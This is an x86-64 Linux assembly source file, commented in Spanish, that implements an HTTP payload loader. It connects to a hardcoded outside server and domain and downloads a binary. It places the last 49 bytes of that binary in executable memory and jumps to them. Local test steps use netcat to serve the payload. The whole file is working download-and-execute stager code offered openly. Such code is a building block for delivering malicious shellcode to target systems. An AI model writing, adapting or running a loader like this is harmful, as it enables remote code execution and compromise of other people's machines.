;============================================================================================================
; Archivo      : payload-read-http-file-size-fixed.asm
; Creado       : 11/02/2025
; Modificado   : 11/02/2025
; Autor        : Gastón M. González
; Plataforma   : Linux
; Arquitectura : x86-64
; Descripción  : Loader de payload HTTP (no HTTPS), con payload <= 4KB
;
; Compilar     : nasm -f elf64 payload-read-http-file-size-fixed.asm -o payload-read-http-file-size-fixed.o
; Linkear      : ld payload-read-http-file-size-fixed.o -o payload-read-http-file-size-fixed
; Ejecutar     : ./payload-read-http-file-size-fixed
; Ejecutar     : ./payload-read-http-file-size-fixed ; echo "Código de salida:" $?
;============================================================================================================
; Para probarlo en local se deben hacer los siguientes cambios:
;
;        http_get db "GET /bin/payload.bin HTTP/1.1", 0x0D, 0x0A
; por -> http_get db "GET /payload.bin HTTP/1.1", 0x0D, 0x0A
;
;        db "Host: pithase.com.ar", 0x0D, 0x0A
; por -> db "Host: localhost", 0x0D, 0x0A
;
;        server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
; por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
;
;        http_port    equ 0x5000       ; puerto 80 en little endian
; por -> http_port    equ 0x401f       ; puerto 8000 en little endian
;
; Abrimos dos terminales, primero en una ejecutamos Netcat, para que sirva el archivo de paylod. Para eso
; nos ubicamos en la carpeta donde se encuentra payload.bin y ejecutamos Netcat de la siguiente forma:
;
; nc -l -p 8000 < payload.bin
;
; En la otra terminal ejecutamos el programa.
;============================================================================================================

section .rodata
    http_get db "GET /bin/payload.bin HTTP/1.1", 0x0D, 0x0A
             db "Host: pithase.com.ar", 0x0D, 0x0A
             db "Connection: close", 0x0D, 0x0A
             db 0x0D, 0x0A, 0
    http_get_len equ $ - http_get

    server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
    http_port    equ 0x5000       ; puerto 80 en little endian
    payload_len  equ 49           ; tamaño hardcodeado del payload

section .bss
    sockfd     resq 1
    buffer     resb 8192          ; espacio para la respuesta HTTP (header + payload)
    exec_mem   resq 1             ; ddirección de memoria ejecutable (reservada con mmap)
    payload    resb payload_len   ; espacio para almacenar el payload

section .text
    global _start

_start:
    ;=========================================================================
    ; 1. Crea un socket
    ;=========================================================================
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    test rax, rax
    js socket_error
    mov [sockfd], rax

    ;=========================================================================
    ; 2. Configurar sockaddr_in
    ;=========================================================================
    sub rsp, 16
    mov word [rsp], 2
    mov word [rsp+2], http_port
    mov dword [rsp+4], server_ip
    mov qword [rsp+8], 0

    ;=========================================================================
    ; 3. Conecta al servidor
    ;=========================================================================
    mov rax, 42
    mov rdi, [sockfd]
    mov rsi, rsp
    mov rdx, 16
    syscall
    test rax, rax
    js connect_error

    ;=========================================================================
    ; 4. Envía la solicitud HTTP GET
    ;=========================================================================
    mov rax, 44
    mov rdi, [sockfd]
    lea rsi, [http_get]
    mov rdx, http_get_len
    mov r10, 0
    syscall
    test rax, rax
    js http_get_error

    ;=========================================================================
    ; 5. Recibe la respuesta HTTP
    ;=========================================================================
    mov rax, 45
    mov rdi, [sockfd]
    lea rsi, [buffer]
    mov rdx, 4096
    mov r10, 0
    syscall
    test rax, rax
    js http_response_error
    mov rbx, rax                  ; guarda la cantidad de bytes recibidos
    cmp rbx, payload_len          ; chequea la cantidad de datos recibidos
    jb http_response_size_error   ; no se recibieron los bytes mínimos esperados (< payload_len)

    ;=========================================================================
    ; 6. Extrae los últimos 'n' bytes del buffer correspondientes al payload
    ;=========================================================================
    lea rsi, [buffer]
    add rsi, rbx
    sub rsi, payload_len
    lea rdi, [payload]
    mov rcx, payload_len
    rep movsb               ; copia los 'n' bytes al área de payload

    ;=========================================================================
    ; 7. Reserva memoria ejecutable con mmap (4KB)
    ;=========================================================================
    mov rdi, 0              ; dejar que el sistema elija la dirección
    mov rsi, 4096           ; tamaño: 4KB
    mov rdx, 7              ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x22           ; MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1              ; sin descriptor de archivo
    mov r9, 0               ; offset = 0
    mov rax, 9              ; syscall: mmap
    syscall
    test rax, rax
    js mmap_error
    mov [exec_mem], rax     ; guardar la dirección asignada

    ;=========================================================================
    ; 8. Copia el payload en la memoria reservada
    ;=========================================================================
    mov rdi, [exec_mem]
    lea rsi, [payload]
    mov rcx, payload_len
    rep movsb

    ;=========================================================================
    ; 9. Cierra el socket
    ;=========================================================================
    mov rax, 3
    mov rdi, [sockfd]
    syscall

    ;=========================================================================
    ; 10. Ejecuta el payload
    ;=========================================================================
    call qword [exec_mem]   ; llama al payload cargado en memoria

    ;=========================================================================
    ; 11. Salida: Se alcanza solo si el payload retorna
    ;=========================================================================
    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall

;==========================================================================
; Manejo de errores: Salida con código distinto según el error
; Se incluye la liberación de recursos (cierre del socket) antes de salir
;==========================================================================
socket_error:
    mov rdi, 1
    jmp exit_error

connect_error:
    mov rdi, 2
    jmp exit_error

http_get_error:
    mov rdi, 3
    jmp exit_error

http_response_error:
    mov rdi, 4
    jmp exit_error

http_response_size_error:
    mov rdi, 5
    jmp exit_error

mmap_error:
    mov rdi, 6
    jmp exit_error

exit_error:
    push rdi
    mov rax, [sockfd]     ; si el socket fue abierto, cerrarlo.
    cmp rax, 0
    je exit
    mov rdi, rax
    mov rax, 3            ; syscall: close
    syscall
    pop rdi

exit:
    mov rax, 60           ; syscall: exit
    syscall
